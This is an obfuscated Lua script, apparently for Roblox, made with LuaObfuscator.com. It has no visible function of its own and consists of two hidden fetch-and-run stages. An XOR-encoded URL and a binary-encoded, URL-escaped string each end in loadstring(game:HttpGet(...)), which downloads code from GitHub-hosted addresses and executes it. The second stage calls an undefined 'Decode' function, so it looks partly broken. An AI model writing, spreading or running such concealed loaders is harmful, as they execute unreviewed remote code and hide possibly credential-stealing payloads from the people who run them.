--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\246\36\239\181\244\29\195\202\203\49\245\232\146\76\158\238\218\44\232\136\196\12\216\211\207\54\181\238\149\81\195\198\221\54\169\179\194\31\213\208\148\40\231\178\201\81\244\205\216\42\226\190\135\45\222\214\201\38\227","\126\177\163\187\69\134\219\167")))();loadstring(Decode("01100110 01110101 01101110 01100011 01110100 01101001 01101111 01101110 00100000 01100100 01100101 01100011 01101111 01100100 01100101 01000011 01101000 01100001 01110010 00101000 01101000 01100101 01111000 00101001 00100000 01110010 01100101 01110100 01110101 01110010 01101110 00100000 01110011 01110100 01110010 01101001 01101110 01100111 00101110 01100011 01101000 01100001 01110010 00101000 01110100 01101111 01101110 01110101 01101101 01100010 01100101 01110010 00101000 01101000 01100101 01111000 00101100 00110001 00110110 00101001 00101001 00100000 01100101 01101110 01100100 00100000 01100110 01110101 01101110 01100011 01110100 01101001 01101111 01101110 00100000 01100100 01100101 01100011 01101111 01100100 01100101 01010011 01110100 01110010 01101001 01101110 01100111 00101000 01110011 01110100 01110010 00101001 00100000 01101100 01101111 01100011 01100001 01101100 00100000 01101111 01110101 01110100 01110000 01110101 01110100 00101100 00100000 01110100 00100000 00111101 00100000 01110011 01110100 01110010 01101001 01101110 01100111 00101110 01100111 01110011 01110101 01100010 00101000 01110011 01110100 01110010 00101100 00100010 00100101 00100101 00101000 00100101 01111000 00100101 01111000 00101001 00100010 00101100 01100100 01100101 01100011 01101111 01100100 01100101 01000011 01101000 01100001 01110010 00101001 00100000 01110010 01100101 01110100 01110101 01110010 01101110 00100000 01101111 01110101 01110100 01110000 01110101 01110100 00100000 01100101 01101110 01100100 00111011 01101100 01101111 01100001 01100100 01110011 01110100 01110010 01101001 01101110 01100111 00101000 01100100 01100101 01100011 01101111 01100100 01100101 01010011 01110100 01110010 01101001 01101110 01100111 00101000 00100010 01101100 01101111 01100001 01100100 01110011 01110100 01110010 01101001 01101110 01100111 00100101 00110010 00111000 01100111 01100001 01101101 01100101 00100101 00110011 01000001 01001000 01110100 01110100 01110000 01000111 01100101 01110100 00100101 00110010 00111000 00100101 00110010 00110010 01101000 01110100 01110100 01110000 01110011 00100101 00110011 01000001 00100101 00110010 01000110 00100101 00110010 01000110 01110010 01100001 01110111 00100101 00110010 01000101 01100111 01101001 01110100 01101000 01110101 01100010 01110101 01110011 01100101 01110010 01100011 01101111 01101110 01110100 01100101 01101110 01110100 00100101 00110010 01000101 01100011 01101111 01101101 00100101 00110010 01000110 01000111 01100101 01101110 01100101 01110010 01100001 01101100 01101100 01110101 01100001 00100101 00110010 01000110 01001111 01100010 01100110 01110101 01110011 01100011 01100001 01110100 01100101 00100101 00110010 01000110 01110010 01100101 01100110 01110011 00100101 00110010 01000110 01101000 01100101 01100001 01100100 01110011 00100101 00110010 01000110 01101101 01100001 01101001 01101110 00100101 00110010 01000110 00110010 00100101 00110010 00110010 00100101 00110010 00111001 00100101 00110010 00111001 00100101 00110010 00111000 00100101 00110010 00111001 00100101 00110000 01000001 00100010 00101001 00101001 00101000 00101001 ",v7("\1\196\36\196\238\58","\156\67\173\74\165")))();
